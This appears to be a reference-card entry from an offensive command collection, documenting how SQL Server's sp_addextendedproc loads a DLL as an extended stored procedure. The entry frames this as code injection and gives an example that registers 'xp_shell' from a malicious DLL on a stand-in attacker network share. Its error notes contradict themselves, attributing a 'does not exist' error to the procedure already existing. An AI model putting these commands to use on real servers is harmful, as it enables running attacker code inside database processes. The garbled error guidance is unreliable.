---
type: command
executor: sql
data: 'sp_addextendedproc ''xp_calc'', ''C:\mydll\xp_calc.dll'''
tags:
  - mssql
  - extended-proc
platforms:
  - Windows
verified: true
validated: true
---

# sp-addextendedproc-load-dll

## Command

```sql
sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
```

## Description

This command adds a new extended stored procedure to SQL Server by loading a specified DLL file. It registers the DLL's function for execution within the SQL Server process, enabling custom code injection. Use this in scenarios requiring server-side execution of external libraries, such as custom utilities or malicious payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'xp_calc' | Name of the extended stored procedure (prefixed with xp_ when calling) | Yes |
| 'C:\mydll\xp_calc.dll' | Full path to the DLL file (local, UNC, or WebDAV) | Yes |

## Examples

### Basic Usage

```sql
sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
```

### Network Path Usage

```sql
sp_addextendedproc 'xp_shell', '\\attacker\share\malicious.dll'
```

## Expected Output

Command completed successfully.

If successful, no output is returned, but you can verify with:
```sql
sp_helpextendedproc 'xp_calc'
```
Expected: Details of the procedure and DLL path.

Errors include: 'Cannot find the object "xp_calc" because it does not exist' if already present, or file access denied if path issues.

## Related

- [[procedures/Load-DLL-Using-sp_addextendedproc]]
- [[commands/exec-extended-proc]]
